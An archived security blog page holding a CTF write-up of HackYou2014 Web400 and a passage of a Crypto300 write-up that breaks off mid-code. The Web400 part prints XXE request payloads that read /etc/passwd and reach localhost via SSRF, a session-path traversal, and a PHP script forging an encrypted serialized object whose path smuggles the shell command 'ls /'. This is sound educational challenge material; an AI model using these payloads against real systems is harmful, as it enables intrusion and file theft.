

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <title>CTF - Page 2 - &lt;/pwntester&gt;</title>
    <meta name="description" content="">

    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <link rel="shortcut icon" href="../../../../assets/favicon.png?v=d47df0f104">

    <link rel="stylesheet" type="text/css" href="../../../../assets/css/screen.css?v=d47df0f104">
    <link href="http://fonts.googleapis.com/css?family=Open+Sans:400,700" rel="stylesheet" type="text/css">
    <link href="http://fonts.googleapis.com/css?family=Roboto" rel="stylesheet" type="text/css">

    <script type="text/javascript" src="../../../../assets/js/jquery-1.11.1.min.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../../../assets/js/jquery.fitvids.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../../../assets/js/moment.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../../../assets/js/handlebars.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../../../assets/js/jquery.tapirus.js?v=d47df0f104"></script> 
    <script type="text/javascript" src="../../../../assets/js/index.js?v=d47df0f104"></script>


    <link rel="canonical" href="http://www.pwntester.com/tag/ctf/page/2/">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <link rel="prev" href="http://www.pwntester.com/tag/ctf/">
    <link rel="next" href="http://www.pwntester.com/tag/ctf/page/3/">
    <meta name="generator" content="Ghost 0.11">
    <link rel="alternate" type="application/rss+xml" title="&lt;/pwntester&gt;" href="http://www.pwntester.com/rss/">

    <link href="http://netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css" rel="stylesheet">

    <link rel="stylesheet" type="text/css" href="../../../../assets/css/prism.css?v=d47df0f104">

    <script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-49973078-2', 'pwntester.com');
  ga('send', 'pageview');

</script></head>

<body class="tag-template tag-ctf paged archive-template">

    <div id="sidebar">
        <div id="sidebar-content" class="inner">
            <a class="blog-logo" href="http://www.pwntester.com"><img src="../../../../content/images/2014/May/rooted.jpeg" alt="Blog Logo"></a>
            <h2 class="blog-title"><a href="http://www.pwntester.com">&lt;/pwntester&gt;</a>
            <h3 class="blog-description"></h3></h2>

            <!--form id="search">
                <input id="search-field" placeholder="Search"/>
            </form-->
            <form id="search">  
                <input id="search-field" type="search" placeholder="Search">
            </form>  

            <div id="sidebar-links">
                <ul id="subscription-links">
                    <li><a target="_blank" href="http://www.pwntester.com/rss/"><i class="fa fa-rss"></i> Subscribe via RSS</a></li>
                    <!-- No support yet
                    <li><a target="_blank" href=" "><i class="fa fa-envelope"></i> Subscribe via email<a></li>
                    -->
                </ul>
                <ul id="sidebar-internal">
                    <!-- For 'About' and other pages -->
                </ul>
                <ul id="sidebar-external">
                    <li class="external-link"><a href="https://github.com/pwntester"><i class="fa fa-github"></i> GitHub</a></li>
<li class="external-link"><a href="http://www.linkedin.com/in/alvaroms"><i class="fa fa-linkedin"></i> LinkedIn</a></li>
<li class="external-link"><a href="https://twitter.com/pwntester"><i class="fa fa-twitter"></i> Twitter</a></li>
<li class="external-link"><a target="_blank" href="mailto:alvaro@pwntester.com"><i class="fa fa-envelope"></i> Contact</a></li>
                </ul>
            </div>

            <footer class="site-footer">
                <section class="copyright">© 2017 <a href="mailto:alvaro@pwntester.com">Alvaro Muñoz</a> • All rights reserved.</section>
            </footer>
        </div>
    </div>

    <main>
        <section id="results"></section>
        

<header class="tag-archive-header">
    <h4><i class="fa fa-tag"></i><span class="tag-archive-header-name">CTF</span></h4>
</header>


<article class="post tag-xxe tag-rce39 tag-ctf tag-php tag-hackyou201458 tag-ssrf">
    <header class="post-header">
        <span class="post-meta"><time datetime="2014-01-17">17 Jan 2014</time> on <a href="../../../xxe/">XXE</a>, <a href="../../../rce39/">RCE</a>, <a href="../../">CTF</a>, <a href="../../../php/">PHP</a>, <a href="../../../hackyou201458/">HackYou2014</a>, <a href="../../../ssrf/">SSRF</a></span>
        <h2 class="post-title"><a href="../../../../blog/2014/01/17/hackyou2014-web400-write-up/">#hackyou2014 Web400 write-up</a></h2>

    </header>
    <section class="post-content">
        <p>I did not solve this <a href="http://hackyou2014tasks.ctf.su:40080/">level</a> during the CTF, but found it so interesting reading <a href="https://twitter.com/Xelenonz">Xelenonz</a> <a href="http://blog.rop.sh/hackyou2014-phpwning-web400/">write-up</a> that I couldnt help trying it myself just for the fun and since this blog is my personal notes, I decided to write it here for future reference, but all credits go to <a href="https://twitter.com/Xelenonz">Xelenonz</a>.</p>

<p>We are given the <a href="http://hackyou.ctf.su/files/web400.zip">code</a> of a Image hostig web app. Reading the code we see how it handle the requests:</p>

<pre><code class="language-lang-php line-numbers data-line=6 ">include 'config.php';  
include 'classes.php';  
$action = (isset($_REQUEST['action'])) ? $_REQUEST['action'] : 'View';
$param = (isset($_REQUEST['param'])) ? $_REQUEST['param'] : 'index';
$page = new $action($param);
echo $page;  
</code></pre>

<p>So <strong>action</strong> is used to instantiate any arbitrary class and <strong>param</strong> is the argument for the constructor. Cool. We are given a bunch of classes the application uses to upload and view images and to manage the Session object:</p>

<pre><code class="language-lang-php line-numbers ">class View {  
    function __construct($page) {
        ob_start();
        readfile('html/header.html');
        switch ($page) {
            case 'index':
                readfile('html/index.tpl.html');
                break;
            case 'upload':
                readfile('html/upload.tpl.html');
                break;
        }
        readfile('html/footer.html');
    }
    function __toString() {
        $this-&gt;content = ob_get_contents();
        ob_end_clean();
        return $this-&gt;content;
    }
}

class Upload {  
    function __construct($data) {
        global $config;
        $this-&gt;data = base64_decode($data);
        $this-&gt;filename = md5(uniqid(rand(), true));
        $this-&gt;path = $config['root'].'images/'.$this-&gt;filename;
        file_put_contents($this-&gt;path, $this-&gt;data);
        $this-&gt;type = exif_imagetype($this-&gt;path);
    }
    function __toString() {
        if ($this-&gt;type) {
            $link = 'http://'.$_SERVER['SERVER_NAME'].'/'.$this-&gt;filename;
            return '&lt;p&gt;Successfully updated!&lt;/p&gt;Your link: &lt;a href="'.$link.'"&gt;'.$link.'&lt;/a&gt;';
        } else {
            return '&lt;p&gt;Wrong file type!&lt;p&gt;';
        }
    }
    function __destruct() {
        if ($this-&gt;type) {
            echo '&lt;p&gt;Some file info:

{gfm-js-extract-pre-1}&lt;/p&gt;';
        } else {
            unlink($this-&gt;path);
        }
    }
}

class Image {  
    function __construct($filename) {
        global $config;
        $this-&gt;filename = $filename;
        $this-&gt;path = $config['root'].'images/'.$this-&gt;filename;
    }
    function __toString() {
        if (preg_match('/^[a-f0-9]{32}$/', $this-&gt;filename) &amp;&amp; file_exists($this-&gt;path)) {
            $this-&gt;type = exif_imagetype($this-&gt;path);
            $this-&gt;mime = image_type_to_mime_type($this-&gt;type);
            header('Content-Type: '.$this-&gt;mime);
            return file_get_contents($this-&gt;path);
        } else {
            return '&lt;h1&gt;Error&lt;/h1&gt;';
        }
    }
}

class Session {  
    function __construct() {
        global $config;
        session_set_save_handler(
            array($this, "open"), array($this, "close"),  array($this, "read"),
            array($this, "write"),array($this, "destroy"),array($this, "gc")
        );
        $this-&gt;key = $config['key'];
        $this-&gt;size = 32;
        $this-&gt;path = '/tmp';
    }

    function encrypt($data) {
        $iv = mcrypt_create_iv($this-&gt;size, MCRYPT_RAND);
        $key = hash('sha256', $this-&gt;key, true);
        $data = $iv.mcrypt_encrypt(MCRYPT_RIJNDAEL_256, $key, $data, MCRYPT_MODE_CBC, $iv);
        return $data;
    }

    function decrypt($data) {
        $key = hash('sha256', $this-&gt;key, true);
        $iv = substr($data, 0, $this-&gt;size);
        $data = substr($data, $this-&gt;size);
        $data = mcrypt_decrypt(MCRYPT_RIJNDAEL_256, $key, $data, MCRYPT_MODE_CBC, $iv);
        return $data;
    }

    function write($id, $data) {
        $path = $this-&gt;path.'/'.$id;
        $data = $this-&gt;encrypt($data);
        file_put_contents($path, $data);
    }

    function read($id) {
        $path = $this-&gt;path.'/'.$id;
        $data = null;
        if (is_file($path)) {
            $data = file_get_contents($path);
            $data = $this-&gt;decrypt($data);
        }
        return $data;
    }

    function open($sess_path, $sess_id) {
        //nothing
    }

    function close() {
        return true;
    }

    function gc($maxlifetime) {
        $path = $this-&gt;path.'/*';
        foreach (glob($path) as $file) {
            if (filemtime($file) + $maxlifetime &lt; time() &amp;&amp; file_exists($file)) {
                unlink($file);
            }
        }
        return true;
    }

    function destroy($id) {
        $path = $this-&gt;path.'/'.$id;
        if (is_file($path)) {
            unlink($path);
        }
        return true;
    }
}
</code></pre>

<p>The most interesting one are the <strong>Upload</strong> class whose destructor runs "arbitrary code" and <strong>Session</strong> which tell us how the Session object is initializated and stored/read from disk (although, we dont know the encryption key that is stored in the config.php file). These are classes are interesting but not useful if we can only create an instance and print the instance tostring return value. Lets look for PHP system classes that could be more useful:</p>

<pre><code class="language-lang-bash line-numbers ">alvaro@winterfell ~&gt; php -r 'var_dump (get_declared_classes ());'  
array(139) {  
  [0]=&gt; string(8) "stdClass"
  [1]=&gt; string(9) "Exception"
  [2]=&gt; string(14) "ErrorException"
  [3]=&gt; string(7) "Closure"
  [4]=&gt; string(8) "DateTime"
  [5]=&gt; string(12) "DateTimeZone"
  [6]=&gt; string(12) "DateInterval"
  [7]=&gt; string(10) "DatePeriod"
  [8]=&gt; string(11) "LibXMLError"
  [9]=&gt; string(7) "SQLite3"
  [10]=&gt; string(11) "SQLite3Stmt"
  [11]=&gt; string(13) "SQLite3Result"
  [12]=&gt; string(12) "DOMException"
  [13]=&gt; string(13) "DOMStringList"
  [14]=&gt; string(11) "DOMNameList"
  [15]=&gt; string(21) "DOMImplementationList"
  [16]=&gt; string(23) "DOMImplementationSource"
  [17]=&gt; string(17) "DOMImplementation"
  [18]=&gt; string(7) "DOMNode"
  [19]=&gt; string(16) "DOMNameSpaceNode"
  [20]=&gt; string(19) "DOMDocumentFragment"
  [21]=&gt; string(11) "DOMDocument"
  [22]=&gt; string(11) "DOMNodeList"
  [23]=&gt; string(15) "DOMNamedNodeMap"
  [24]=&gt; string(16) "DOMCharacterData"
  [25]=&gt; string(7) "DOMAttr"
  [26]=&gt; string(10) "DOMElement"
  [27]=&gt; string(7) "DOMText"
  [28]=&gt; string(10) "DOMComment"
  [29]=&gt; string(11) "DOMTypeinfo"
  [30]=&gt; string(18) "DOMUserDataHandler"
  [31]=&gt; string(11) "DOMDomError"
  [32]=&gt; string(15) "DOMErrorHandler"
  [33]=&gt; string(10) "DOMLocator"
  [34]=&gt; string(16) "DOMConfiguration"
  [35]=&gt; string(15) "DOMCdataSection"
  [36]=&gt; string(15) "DOMDocumentType"
  [37]=&gt; string(11) "DOMNotation"
  [38]=&gt; string(9) "DOMEntity"
  [39]=&gt; string(18) "DOMEntityReference"
  [40]=&gt; string(24) "DOMProcessingInstruction"
  [41]=&gt; string(15) "DOMStringExtend"
  [42]=&gt; string(8) "DOMXPath"
  [43]=&gt; string(5) "finfo"
  [44]=&gt; string(14) "LogicException"
  [45]=&gt; string(24) "BadFunctionCallException"
  [46]=&gt; string(22) "BadMethodCallException"
  [47]=&gt; string(15) "DomainException"
  [48]=&gt; string(24) "InvalidArgumentException"
  [49]=&gt; string(15) "LengthException"
  [50]=&gt; string(19) "OutOfRangeException"
  [51]=&gt; string(16) "RuntimeException"
  [52]=&gt; string(20) "OutOfBoundsException"
  [53]=&gt; string(17) "OverflowException"
  [54]=&gt; string(14) "RangeException"
  [55]=&gt; string(18) "UnderflowException"
  [56]=&gt; string(24) "UnexpectedValueException"
  [57]=&gt; string(25) "RecursiveIteratorIterator"
  [58]=&gt; string(16) "IteratorIterator"
  [59]=&gt; string(14) "FilterIterator"
  [60]=&gt; string(23) "RecursiveFilterIterator"
  [61]=&gt; string(22) "CallbackFilterIterator"
  [62]=&gt; string(31) "RecursiveCallbackFilterIterator"
  [63]=&gt; string(14) "ParentIterator"
  [64]=&gt; string(13) "LimitIterator"
  [65]=&gt; string(15) "CachingIterator"
  [66]=&gt; string(24) "RecursiveCachingIterator"
  [67]=&gt; string(16) "NoRewindIterator"
  [68]=&gt; string(14) "AppendIterator"
  [69]=&gt; string(16) "InfiniteIterator"
  [70]=&gt; string(13) "RegexIterator"
  [71]=&gt; string(22) "RecursiveRegexIterator"
  [72]=&gt; string(13) "EmptyIterator"
  [73]=&gt; string(21) "RecursiveTreeIterator"
  [74]=&gt; string(11) "ArrayObject"
  [75]=&gt; string(13) "ArrayIterator"
  [76]=&gt; string(22) "RecursiveArrayIterator"
  [77]=&gt; string(11) "SplFileInfo"
  [78]=&gt; string(17) "DirectoryIterator"
  [79]=&gt; string(18) "FilesystemIterator"
  [80]=&gt; string(26) "RecursiveDirectoryIterator"
  [81]=&gt; string(12) "GlobIterator"
  [82]=&gt; string(13) "SplFileObject"
  [83]=&gt; string(17) "SplTempFileObject"
  [84]=&gt; string(19) "SplDoublyLinkedList"
  [85]=&gt; string(8) "SplQueue"
  [86]=&gt; string(8) "SplStack"
  [87]=&gt; string(7) "SplHeap"
  [88]=&gt; string(10) "SplMinHeap"
  [89]=&gt; string(10) "SplMaxHeap"
  [90]=&gt; string(16) "SplPriorityQueue"
  [91]=&gt; string(13) "SplFixedArray"
  [92]=&gt; string(16) "SplObjectStorage"
  [93]=&gt; string(16) "MultipleIterator"
  [94]=&gt; string(14) "SessionHandler"
  [95]=&gt; string(22) "__PHP_Incomplete_Class"
  [96]=&gt; string(15) "php_user_filter"
  [97]=&gt; string(9) "Directory"
  [98]=&gt; string(20) "mysqli_sql_exception"
  [99]=&gt; string(13) "mysqli_driver"
  [100]=&gt; string(6) "mysqli"
  [101]=&gt; string(14) "mysqli_warning"
  [102]=&gt; string(13) "mysqli_result"
  [103]=&gt; string(11) "mysqli_stmt"
  [104]=&gt; string(12) "PDOException"
  [105]=&gt; string(3) "PDO"
  [106]=&gt; string(12) "PDOStatement"
  [107]=&gt; string(6) "PDORow"
  [108]=&gt; string(13) "PharException"
  [109]=&gt; string(4) "Phar"
  [110]=&gt; string(8) "PharData"
  [111]=&gt; string(12) "PharFileInfo"
  [112]=&gt; string(19) "ReflectionException"
  [113]=&gt; string(10) "Reflection"
  [114]=&gt; string(26) "ReflectionFunctionAbstract"
  [115]=&gt; string(18) "ReflectionFunction"
  [116]=&gt; string(19) "ReflectionParameter"
  [117]=&gt; string(16) "ReflectionMethod"
  [118]=&gt; string(15) "ReflectionClass"
  [119]=&gt; string(16) "ReflectionObject"
  [120]=&gt; string(18) "ReflectionProperty"
  [121]=&gt; string(19) "ReflectionExtension"
  [122]=&gt; string(23) "ReflectionZendExtension"
  [123]=&gt; string(16) "SimpleXMLElement"
  [124]=&gt; string(17) "SimpleXMLIterator"
  [125]=&gt; string(4) "SNMP"
  [126]=&gt; string(13) "SNMPException"
  [127]=&gt; string(10) "SoapClient"
  [128]=&gt; string(7) "SoapVar"
  [129]=&gt; string(10) "SoapServer"
  [130]=&gt; string(9) "SoapFault"
  [131]=&gt; string(9) "SoapParam"
  [132]=&gt; string(10) "SoapHeader"
  [133]=&gt; string(4) "tidy"
  [134]=&gt; string(8) "tidyNode"
  [135]=&gt; string(9) "XMLReader"
  [136]=&gt; string(9) "XMLWriter"
  [137]=&gt; string(13) "XSLTProcessor"
  [138]=&gt; string(10) "ZipArchive"
}
</code></pre>

<p>That's a bunch of classes but going through them we find two that are particulary interest: "SplFileObject" and "SimpleXmlElement". <br>
With SplFileObject we are returned the first line of any file:</p>

<p><img src="../../../../content/images/octopress/web400-0.png" alt=""></p>

<p>You can however, use PHP filters to encode it base64 and get all file contents as a long base64 line:</p>

<p><img src="../../../../content/images/octopress/web400-1.png" alt=""></p>

<p>Thats pretty cool, now we can decode it and get the key:</p>

<pre><code class="language-lang-php line-numbers ">$config = array();
$config['root'] = '/var/www/';
$config['key'] = '6hQJMFh8gRje67EmpDX3';
$config['IP'] = array('127.0.0.1');
$config['password'] = '3fd5b6db6bc90ddd6a6f6caad27d8b00';
</code></pre>

<p>And thats basically as far as I got, I could not bypass the restriction in the "admin.php" to allow only requests from localhost so I could not start the session and try to take advantage of it.</p>

<p>After the CTF ended I found out that we could submit XML documents with external entities and launch a SSRF attack from there. Lets see how. <br>
We can use the "SimpleXMLElement" class to create XML documents like:</p>

<pre><code class="language-lang-bash line-numbers ">POST /index.php?action=SimpleXMLElement HTTP/1.1  
Host: hackyou2014tasks.ctf.su:40080  
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:26.0) Gecko/20100101 Firefox/26.0  
Content-Type: application/x-www-form-urlencoded;application/xml  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  
Accept-Language: en-us,es-es;q=0.8,es;q=0.5,en;q=0.3  
Accept-Encoding: gzip, deflate  
Connection: keep-alive  
Content-Length: 21

param=&lt;foo&gt;test&lt;/foo&gt;  
</code></pre>

<p><img src="../../../../content/images/octopress/web400-2.png" alt=""></p>

<p>Actually I tried this during the CTF but forgot to add the "Content-Type" header so kept on getting "Internal Server Errors", damn!</p>

<p>Anyway, The server returns us our XML document so now we can try to inject external entities:</p>

<pre><code class="language-lang-bash line-numbers ">POST /index.php?action=SimpleXMLElement HTTP/1.1  
Host: hackyou2014tasks.ctf.su:40080  
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:26.0) Gecko/20100101 Firefox/26.0  
Content-Type: application/x-www-form-urlencoded;application/xml  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  
Accept-Language: en-us,es-es;q=0.8,es;q=0.5,en;q=0.3  
Accept-Encoding: gzip, deflate  
Connection: keep-alive  
Content-Length: 76

param=&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "/etc/passwd" &gt;]&gt;&lt;foo&gt;%26xxe;&lt;/foo&gt;  
</code></pre>

<pre><code class="language-lang-bash line-numbers ">HTTP/1.1 200 OK  
Date: Fri, 17 Jan 2014 13:49:12 GMT  
Server: Apache/2.2.22 (Ubuntu)  
X-Powered-By: PHP/5.3.10-1ubuntu3.8  
Vary: Accept-Encoding  
Content-Length: 1041  
Keep-Alive: timeout=5, max=100  
Connection: Keep-Alive  
Content-Type: text/html

root:x:0:0:root:/root:/bin/bash  
daemon:x:1:1:daemon:/usr/sbin:/bin/sh  
bin:x:2:2:bin:/bin:/bin/sh  
sys:x:3:3:sys:/dev:/bin/sh  
sync:x:4:65534:sync:/bin:/bin/sync  
games:x:5:60:games:/usr/games:/bin/sh  
man:x:6:12:man:/var/cache/man:/bin/sh  
lp:x:7:7:lp:/var/spool/lpd:/bin/sh  
mail:x:8:8:mail:/var/mail:/bin/sh  
news:x:9:9:news:/var/spool/news:/bin/sh  
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh  
proxy:x:13:13:proxy:/bin:/bin/sh  
www-data:x:33:33:www-data:/var/www:/bin/sh  
backup:x:34:34:backup:/var/backups:/bin/sh  
list:x:38:38:Mailing List Manager:/var/list:/bin/sh  
irc:x:39:39:ircd:/var/run/ircd:/bin/sh  
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh  
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh  
libuuid:x:100:101::/var/lib/libuuid:/bin/sh  
syslog:x:101:103::/home/syslog:/bin/false  
messagebus:x:102:105::/var/run/dbus:/bin/false  
whoopsie:x:103:106::/nonexistent:/bin/false  
landscape:x:104:109::/var/lib/landscape:/bin/false  
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin  
user:x:1000:1000:user,,,:/home/user:/bin/bash  
</code></pre>

<p>The nice thing about this XXE vulnerability is not that we can read any file (that we already could using the SplFileObject class) but that we can use to initiate requests from the own server!</p>

<p>Now we can bypass localhost address restriction, however accessing <a href="http://locahost/admin.php">http://locahost/admin.php</a> returns some characters that break the XML schema so we will use the PHP base64 encoder filter to return an XML schema friendly version of the page:</p>

<pre><code class="language-lang-bash line-numbers ">POST /index.php?action=SimpleXMLElement HTTP/1.1  
Host: hackyou2014tasks.ctf.su:40080  
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:26.0) Gecko/20100101 Firefox/26.0  
Content-Type: application/x-www-form-urlencoded;application/xml  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  
Accept-Language: en-us,es-es;q=0.8,es;q=0.5,en;q=0.3  
Accept-Encoding: gzip, deflate  
Connection: keep-alive  
Content-Length: 140

param=&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=http://localhost/admin.php" &gt;]&gt;&lt;foo&gt;%26xxe;&lt;/foo&gt;  
</code></pre>

<pre><code class="language-lang-bash line-numbers ">HTTP/1.1 200 OK  
Date: Fri, 17 Jan 2014 13:51:57 GMT  
Server: Apache/2.2.22 (Ubuntu)  
X-Powered-By: PHP/5.3.10-1ubuntu3.8  
Vary: Accept-Encoding  
Content-Length: 256  
Keep-Alive: timeout=5, max=100  
Connection: Keep-Alive  
Content-Type: text/html

PGh0bWw+Cjxib2R5PgoJPGI+RW50ZXIgcGFzc3dvcmQ6PC9iPgoJPGZvcm0gYWN0aW9uPSJhZG1pbi5waHAiIG1ldGhvZD0iUE9TVCI+CgkJPGlucHV0IHR5cGU9InRleHQiIG5hbWU9InBhc3N3b3JkIj4KCQk8aW5wdXQgdHlwZT0ic3VibWl0IiBuYW1lPSJzdWJtaXQiIHZhbHVlPSJHTyI+Cgk8L2Zvcm0+CjwvYm9keT4KPC9odG1sPgo=  
</code></pre>

<p>That decodes into:</p>

<pre><code class="language-lang-html line-numbers ">&lt;html&gt;  
&lt;body&gt;  
    &lt;b&gt;Enter password:&lt;/b&gt;
    &lt;form action="admin.php" method="POST"&gt;
        &lt;input type="text" name="password"&gt;
        &lt;input type="submit" name="submit" value="GO"&gt;
    &lt;/form&gt;
&lt;/body&gt;  
&lt;/html&gt;  
</code></pre>

<p>Now, I dont really need to become admin since right after the local IP check, the Session is initialized:</p>

<pre><code class="language-lang-php line-numbers ">if (!in_array($_SERVER['REMOTE_ADDR'], $config['IP']))  
    die('&lt;h1&gt;Access denied&lt;/h1&gt;');

$handler = new Session();
session_start();  
</code></pre>

<p>So <strong>session_start()</strong> will call the session handler <strong>open()</strong> and <strong>read()</strong> methods to restore the session. If we look at our custom Session handler we see that the serialized session is read from /tmp/&lt;phpsessionid&gt;:</p>

<pre><code class="language-lang-php line-numbers data-line=9,16-17 ">function __construct() {  
    global $config;
    session_set_save_handler(
        array($this, "open"), array($this, "close"),  array($this, "read"),
        array($this, "write"),array($this, "destroy"),array($this, "gc")
    );
    $this-&gt;key = $config['key'];
    $this-&gt;size = 32;
    $this-&gt;path = '/tmp';
}

function read($id) {  
    $path = $this-&gt;path.'/'.$id;
    $data = null;
    if (is_file($path)) {
        $data = file_get_contents($path);
        $data = $this-&gt;decrypt($data);
    }
    return $data;
}
</code></pre>

<p>And since we can control PHPSESSIONID by sending it as a query parameter using the SSRF attack, we can point the <strong>read()</strong> method to a different file. Luckly for us we can upload images to /var/www/images right?? so if we make:</p>

<pre><code class="language-lang-bash line-numbers ">PHPSESSIONID=../var/www/images/&lt;image under control&gt;  
</code></pre>

<p>We will fool the application to read the session from our file. All we have to do now is uploading an image that is an encrypted version of a serialized session containing any arbitrary objects we want to store there.</p>

<p>Here its where the <strong>Upload</strong> class come really handy since its destructor can execute any command if we control the $this-path variable which we do:</p>

<pre><code class="language-lang-php line-numbers ">class Upload {  
    function __construct($data) {
        global $config;
        $this-&gt;data = base64_decode($data);
        $this-&gt;filename = md5(uniqid(rand(), true));
        $this-&gt;path = $config['root'].'images/'.$this-&gt;filename;
        file_put_contents($this-&gt;path, $this-&gt;data);
        $this-&gt;type = exif_imagetype($this-&gt;path);
    }
    function __toString() {
        if ($this-&gt;type) {
            $link = 'http://'.$_SERVER['SERVER_NAME'].'/'.$this-&gt;filename;
            return '&lt;p&gt;Successfully updated!&lt;/p&gt;Your link: &lt;a href="'.$link.'"&gt;'.$link.'&lt;/a&gt;';
        } else {
            return '&lt;p&gt;Wrong file type!&lt;p&gt;';
        }
    }
    function __destruct() {
        if ($this-&gt;type) {
            echo '&lt;p&gt;Some file info:

{gfm-js-extract-pre-2}&lt;/p&gt;';
        } else {
            unlink($this-&gt;path);
        }
    }
}
</code></pre>

<p>So we can craft a session object containing an instance of a hand crafted <strong>Upolad*</strong> class and assign it to $_SESSION['auth'] (so the welcome message is printed).</p>

<p>Also, if we want to obtain our exploit "image" hash to craft the PHPSESSIONID, we need our exploit to have "$this-&gt;type &gt; 0" and for that we need <strong>exif_imagetype()</strong> to return a value bigger than 0. So our exploit will be generated with the following script that will run "ls /" when the Upload instance is destroyed. PHP 5 introduced a destructor concept similar to that of other object-oriented languages, such as C++. The destructor method will be called as soon as there are no other references to a particular object, or in any order during the shutdown sequence.</p>

<pre><code class="language-lang-php line-numbers ">class Upload {  
    function __construct($path) {
        $this-&gt;data = "";
        $this-&gt;filename = "";
        $this-&gt;path = $path;
        $this-&gt;type = "image/jpeg";
    }
}

function encrypt($data) {  
        $size = 32;
        $key = '6hQJMFh8gRje67EmpDX3';
        $iv = mcrypt_create_iv($size, MCRYPT_RAND);
        $key = hash('sha256', $key, true);
        $data = $iv.mcrypt_encrypt(MCRYPT_RIJNDAEL_256, $key, $data, MCRYPT_MODE_CBC, $iv);
        return $data;
}

$upload = new Upload("img; ls /");
$payload = 'auth|'.serialize($upload);
$data = '';
$file = 0;
while (true){  
    echo '.';
    $data = encrypt($payload);
    file_put_contents("exploit",$data);
    $file = exif_imagetype('exploit');
    if($file &gt; 0){
        echo $file."\n";
        die("Done\n");
    };
};
</code></pre>

<p>Now our exploit will be accepted:</p>

<p><img src="../../../../content/images/octopress/web400-3.png" alt=""></p>

<p>All we are left to do is use our SSRF vector to visit the admin.php page for us and make it set the PHPSESSIONID in the query parameter:</p>

<p><img src="../../../../content/images/octopress/web400-4.png" alt=""></p>

<p>If we decode the response:</p>

<p><img src="../../../../content/images/octopress/web400-5.png" alt=""></p>

<p>The flag was:</p>

<pre><code class="language-lang-bash line-numbers ">CTF{42a38432d46b9054004a7a87fd3140c7}  
</code></pre>
    </section>
</article>


<article class="post tag-ctf tag-hackyou201458 tag-crypto">
    <header class="post-header">
        <span class="post-meta"><time datetime="2014-01-16">16 Jan 2014</time> on <a href="../../">CTF</a>, <a href="../../../hackyou201458/">HackYou2014</a>, <a href="../../../crypto/">Crypto</a></span>
        <h2 class="post-title"><a href="../../../../blog/2014/01/16/hackyou2014-crypto300-write-up/">#hackyou2014 Crypto300 write-up</a></h2>

    </header>
    <section class="post-content">
        <p>In this <a href="http://hackyou.ctf.su/tasks/crypto300">level</a> we are presented with a crypto system based on Matrix operations:</p>

<pre><code class="language-lang-python line-numbers ">#!/usr/bin/python
import random  
from struct import pack

def Str2matrix(s):  
    #convert string to 4x4 matrix
    return [map(lambda x : ord(x), list(s[i:i+4])) for i in xrange(0, len(s), 4)]

def Matrix2str(m):  
    #convert matrix to string
    return ''.join(map(lambda x : ''.join(map(lambda y : pack('!H', y), x)), m))

def Generate(password):  
    #generate key matrix
    random.seed(password)
    return [[random.randint(0,64) for i in xrange(4)] for j in xrange(4)]

def Multiply(A,B):  
    #multiply two 4x4 matrix
    C = [[0 for i in xrange(4)] for j in xrange(4)]
    for i in xrange(4):
        for j in xrange(4):
            for k in xrange(4):
                C[i][j] += A[i][k] * B[k][j]
    return C

def Encrypt(fname):  
    #encrypt file
    key = Generate('')
    data = open(fname, 'rb').read()
    length = pack('!I', len(data))
    while len(data) % 16 != 0:
        data += '\x00'
    out = open(fname + '.out', 'wb')
    out.write(length)
    for i in xrange(0, len(data), 16):
        cipher = Multiply(Str2matrix(data[i:i+16]), key)
        out.write(Matrix2str(cipher))
    out.close()

Encrypt('flag.wmv')  
</code></pre>

<p>The <strong>Encrypt()</strong> function generates a 4x4 matrix based on a seed not providen. This matrix is used to encrypt a byte array. Here is how:</p>

<ul>
<li>File to be encrypted is padded with 0 until its a factor of 16.</li>
<li>Then it is split in 16 bytes chunks that are reordened as 4x4 lists</li>
<li>Each of this 4x4 matrix is multiplied by the key matrix</li>
<li>The encrypted file is generated by appending the length of the encrpyted data and the encrypted bytes</li>
</ul>

<p>Matrix multiplications are reversible using inverse matrixes so if <strong>E = P * K</strong> then <strong>P.I * E = P.I * P * K</strong> so <strong>K = P.I * E</strong> where:</p>

<ul>
<li><strong>P</strong> is a plaintext matrix</li>
<li><strong>E</strong> is a encrypted matrix of plaintext matrix</li>
<li><strong>P.I</strong> is the inverse of P</li>
</ul>

<p>So if we want to extract the key we need to know at least one plaintext 4x4 matrix (P). Fortunately for us the file we need to decrypt is "flag.wmv.out" sounds like it is a WMV file and we know that its magic number is:</p>

<pre><code class="language-lang-bash line-numbers ">3026b2758e66cf11a6d900aa0062ce6c  
</code></pre>

<p>Thats exactly 16 bytes :D So to extract the key:</p>

<pre><code class="language-lang-python line-numbers ">#!/usr/bin/python
import random  
from struct import pack  
from struct import unpack  
from numpy import *

def Str2matrix(s):  
    return [map(lambda x : ord(x), list(s[i:i+4])) for i in xrange(0, len(s), 4)]

def DecStr2matrix(s):  
    matrix = []
    row = []
    rowcount = 0
    for i in xrange(0, len(s), 2):
        item = int(s[i:i+2].encode("hex"),16)
        row.append(item)
        rowcount += 1
        if rowcount==4:
            rowcount=0
            matrix.append(row)
            row=[]
    return matrix

def Matrix2str(m):  
